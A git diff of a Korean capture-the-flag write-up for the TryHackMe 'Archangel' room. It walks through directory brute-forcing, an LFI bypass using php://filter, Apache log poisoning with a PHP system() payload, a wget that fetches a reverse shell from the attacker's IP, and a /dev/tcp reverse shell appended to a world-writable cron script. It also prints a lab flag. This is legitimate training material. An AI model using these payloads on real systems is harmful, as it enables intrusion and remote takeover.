@@ -53,9 +53,11 @@ Nmap done: 1 IP address (1 host up) scanned in 77.49 seconds
 - 해당 주소 접속시 아무런 동작을 수행하지 않는 사이트가 존재함.
 - 소스코드에서 유의미한 정보가 노출되어있지 않음
 ### Gobuster 을 통한 디렉터리 부르트포싱
+
 ```
 gobuster dir -u {target_ip} -w /usr/share/wordlists/dirb/common.txt -f
 ```
+
 ```
 ===============================================================
 Gobuster v3.6
@@ -87,6 +89,7 @@ Progress: 4614 / 4615 (99.98%)
 Finished
 ===============================================================
 ```
+
 - 몇몇의 숨겨진 경로를 발견하였으나, 유의미한 경로는 아님
 - 유의미한 디렉터리 및 파일은 발견되지 않았음, 
 - 공격 대상 IP에 대해 가상 호스트 사용 가능성을 두고 웹 사이트 내 도메인을 찾아봄
@@ -94,9 +97,11 @@ Finished
 ![그림1-2](/assets/image/thm_archangel/image2.png)
 - 플래그를 획득 할 수 있었음
 ### 추가 획득한 도메인에 대한 2차 디렉터리 부르트 포싱
+
 ```
 gobuster dir -u http://mafialive.thm/ -w /usr/share/wordlists/dirb/common.txt -f -x php, txt
 ```
+
 ```
 ===============================================================
 Gobuster v3.6
@@ -137,10 +142,13 @@ Starting gobuster in directory enumeration mode
 - 이를 통해 LFI 취약점이 존재할 것이라고 판단함.
 - 개념증명을 위해 ../../../../etc/passwd 경로로 접근을 시도하였으나, 허용되지 않음
 - 해당 서버가 PHP로 구동 되고 있어 PHP Filter을 사용하여 LFI 취약점 방어를 우회 시도
+
 ```
 http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
 ```
+
 - 위와 같이 요청하였으며, PHP Filter을 사용하지 않았을 경우 아무것도 출력되지 않았으나, 위와같이 필터를 적용한 경우 base64 인코딩 된 값이 노출됨
+
 ```shell
 echo 'CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==' | base64 -d
 ```
@@ -192,6 +200,7 @@ echo 'CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aX
 ```
 GET /test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=wget+http://10.4.47.45/reverse.php 
 ```
+
 ![그림 1-7](/assets/image/thm_archangel/image7.png)
 
 - 성공적으로 악성 코드를 받을 수 있었다.
@@ -209,14 +218,17 @@ User-Agent: <?php system($_GET['cmd']);?>
 ### opt 디렉터리 내 의심 파일 확인
 > opt 디렉터리는 사용자가 따로 외부 프로그램을 설치하는 경로이다.
 - opt 경로에 사용자가 임의로 생성한 디렉터리와 파일이 존재했다.
+
 ```
 drwxrwxrwx  3 root      root      4096 Nov 20  2020 .                                          
 drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..                                         
 drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles                                
 -rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
 ```
+
 - backupfiles 디렉터리는 other권한이 주어져있지 않아 접근이 되지 않았다.
 - helloworld.sh 라는 쉘 스크립트에 풀권한이 주어져 있으며, 해당 스크립트 내에 어떠한 문자열들이 존재하는지 확인했다.
+
 ```
 cat helloworld.sh                                                                              
 #!/bin/bash                                                                                    
@@ -224,15 +236,18 @@ echo "hello world" >> /opt/backupfiles/helloworld.txt
 ```
 - hello wold 라는 문자를 백업 디렉터리 내에 텍스트 파일에 추가하고 있다.
 ### cron 작업을 하는 파일 내 악성 코드 삽입
+
 ```
 drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles                                     
 drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret                                      
 -rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
 ```
+
 - archangel 사용자의 홈 디렉터리로 가본 결과 플래그파일과 두 개의 디렉터리가 존재함
 - secret 경로는 권한이 없어 myfiles 디렉터리로 이동
 - 유의미한 파일은 없었음
 - 파일을 추가하는 내용을 보다보니 >>(추가) 를 하는 걸로 보아 cron작동이 의심스러워 크론 작업을 확인해보았다.
+
 ```
 cat /etc/crontab                                                                               
 # /etc/crontab: system-wide crontab                                                            
@@ -255,9 +270,11 @@ ly )
 hly )                                                                                          
 # 
 ```
+
 - 1분 주기로 helloworld.sh가 archangel 권한으로 실행되고 있다.
 - 또한 해당 파일은 풀 권한이므로 쓰기가 가능하다.
 - 즉, 공격자 PC에서 포트를 열고 해당 파일에 공격자 포트로 접속을 시도하도록 Reverse Connection이 이루어지도록 코드 삽입이 가능하다.
+
 ```
 www-data@ubuntu:/opt$ echo 'sh -i >& /dev/tcp/10.4.47.45/5252 0>&1' >> helloworld.sh            
 < >& /dev/tcp/10.4.47.45/5252 0>&1' >> helloworld.sh                                            
@@ -267,20 +284,25 @@ cat helloworld.sh
 echo "hello world" >> /opt/backupfiles/helloworld.txt                                           
 sh -i >& /dev/tcp/10.4.47.45/5252 0>&1
 ```
+
 ![그림 1-9](/assets/image/thm_archangel/image9.png)
 - 성공적으로 archange 사용자의 권한을 획득했다.
+
 ```
 archangel@ubuntu:~/secret$ ls -l
 │ls -l
 │-rwsr-xr-x 1 root root 16904 Nov 18  2020 backup
 │-rw-r--r-- 1 root root    49 Nov 19  2020 user2.txt
 ```
+
  - 플래그 파일과 backup 파일이 존재
  - backup 파일에 SUID가 설정되어 있으며, root 소유자로 되어있다. 해당 파일에 어떠한 문자열들이 존재하는지 확인 해보았다.
  ### 실행 파일 내 시스템 명령어 절대경로 미사용 확인
+
  ```
  cp /home/user/archangel/myfiles/* /opt/backupfiles
  ```
+ 
  - 파일 내 문자열 중 CP 명령어를 사용하는 부분이 확인 되었으며, 
  - 이 때 CP명령어가 절대경로가 아닌 $PATH 에 등록되어 있는 경로대로 사용하도록 되어있다.
 ## 관리자 권한 획득
